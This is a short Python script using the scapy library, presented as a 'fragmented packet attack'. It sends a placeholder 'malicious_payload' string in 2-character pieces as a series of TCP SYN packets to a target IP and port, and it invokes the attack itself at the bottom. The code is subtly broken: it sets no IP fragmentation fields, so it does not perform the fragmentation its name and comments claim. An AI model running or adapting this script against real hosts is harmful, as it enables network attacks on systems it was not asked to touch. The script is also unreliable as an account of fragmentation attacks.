from scapy.all import * 
from random import randint 

def fragmented_packet_attack(target_ip, target_port):
    # Create an IP header with the target IP address
    ip_header = IP(dst=target_ip)
    
    # Create a TCP header with the target port and SYN flag set
    tcp_header = TCP(dport=target_port, seq=randint(0, 2**32 - 1), flags='S')
    
    # Define a malicious payload
    payload = 'malicious_payload'

    # Split the payload into fragments of a specified size
    fragment_size = 2
    fragments = [payload[i:i+fragment_size] for i in range(0, len(payload), fragment_size)]

    # Loop through each fragment and send a fragmented packet
    for fragment in fragments:
        # Create a packet with the IP header, TCP header, and current fragment
        packet = ip_header / tcp_header / fragment 
        # Send the packet
        send(packet)

    # Print a message indicating the attack
    print(f'Sent fragmented attack to {target_ip}:{target_port}')

# Define the target IP address and port
target_ip = '256.256.256.256'  # Note: Invalid IP address for demonstration purposes
target_port = 80

# Call the function to perform the fragmented packet attack
fragmented_packet_attack(target_ip, target_port)
